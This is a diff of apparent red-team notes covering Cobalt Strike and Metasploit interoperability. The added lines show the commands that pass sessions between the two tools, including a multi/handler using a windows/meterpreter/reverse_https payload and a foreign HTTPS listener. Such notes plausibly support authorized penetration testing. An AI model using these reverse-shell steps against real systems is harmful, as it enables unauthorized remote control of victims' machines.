@@ -213,10 +213,19 @@ Cobalt
   SSH-Key: shh-key 10.10.5.5:22 root /path/to/file.key
   
   Connect MetaSploit to Cobalt Listener
-    set lhost cobalt host
-    set lport cobalt listener
-    set prependmigrate true
-    set disablepayloadhandler true
+    msf: set lhost cobalt host
+    msf: set lport cobalt listener (normal https listener)
+    msf: set prependmigrate true
+    msf: set disablepayloadhandler true
+    msf: exploit
+    
+  Connect Cobalt to Metasploit
+    cobalt: create foreign https listener
+    msf: use multi/handler
+    msf: set payload windows/meterpreter/reverse_https
+    msf: set ExitOnSesssion False
+    msf: exploit -j
+    cobalt: spawn x86 foreign-https
 
 Proxy DNS
     Install dnschef
